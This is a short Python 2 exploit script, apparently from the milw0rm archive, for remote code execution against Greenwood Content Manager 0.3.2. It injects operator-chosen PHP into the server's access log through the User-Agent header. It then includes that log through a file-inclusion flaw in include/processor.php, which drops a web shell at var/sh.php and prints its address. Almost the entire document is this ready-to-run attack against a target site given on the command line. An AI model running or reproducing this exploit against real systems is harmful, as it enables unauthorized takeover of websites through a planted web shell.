#!usr/bin/python
#####################################################################################
####            Greenwood Content Manager Remote Code Execution                  ####
#####################################################################################
#                                                                                   #
#AUTHOR : Sina Yazdanmehr (R3d.W0rm)                                                #
#Discovered by : Sina Yazdanmehr (R3d.W0rm)                                         #
#Our Site : http://ircrash.com                                                      #
#My Official WebSite : http://r3dw0rm.ir                                            #
#IRCRASH Team Members : Khashayar Fereidani - R3d.w0rm (Sina Yazdanmehr)            #
#####################################################################################
#                                                                                   #
#Download : http://garr.dl.sourceforge.net/sourceforge/greenwood/greenwood-release-0.3.2.tar.bz2
#                                                                                   #
#Dork :  :(                                                                           #
#                                                                                   #
#####################################################################################
#                                      [Bug]                                        #
#                                                                                   #
#http://[site]/[path]/include/processor.php?content_path=[evil_code_path]           #
#                                                                                   #
###################################### TNX GOD ######################################
import sys,httplib,urllib
if len(sys.argv) < 3 :
    print "\n\rUsage : " + sys.argv[0] + " [site] [path]\n\r"
    print "Ex : " + sys.argv[0] + " 123.com /greenwood/\n\r"
    print "Powered by : Sina Yazdanmehr( R3d.W0rm )\n\r"
    print "http://IrCrash.com - http://R3dW0rm.ir\n\r"
    exit()
if 'http://' in sys.argv[1] :
    sys.argv[1]=sys.argv[1].replace('http://','')
print "Input evil code.( With out ' and <??> )( Ex. include $_GET[file]; )\n\r"
shell=raw_input('Code : ')
user_agent={'User-Agent':'<?php fwrite($fp=fopen("../var/sh.php","w+"),\'<?php /* Exploited by : R3d.W0rm - http://r3dw0rm.ir */ ' + shell + '?>\');fclose($fp); ?>'}
conn=httplib.HTTPConnection(sys.argv[1],80)
conn.request("POST",'/' + sys.argv[2] + '/','',user_agent)
response=conn.getresponse().read()
urllib.urlopen('http://' + sys.argv[1] + '/' + sys.argv[2] + '/include/processor.php?content_path=../var/access_log')
print "\n\rShell created : http://" +  sys.argv[1] + sys.argv[2] + "/var/sh.php\n\r"

# milw0rm.com [2009-07-15]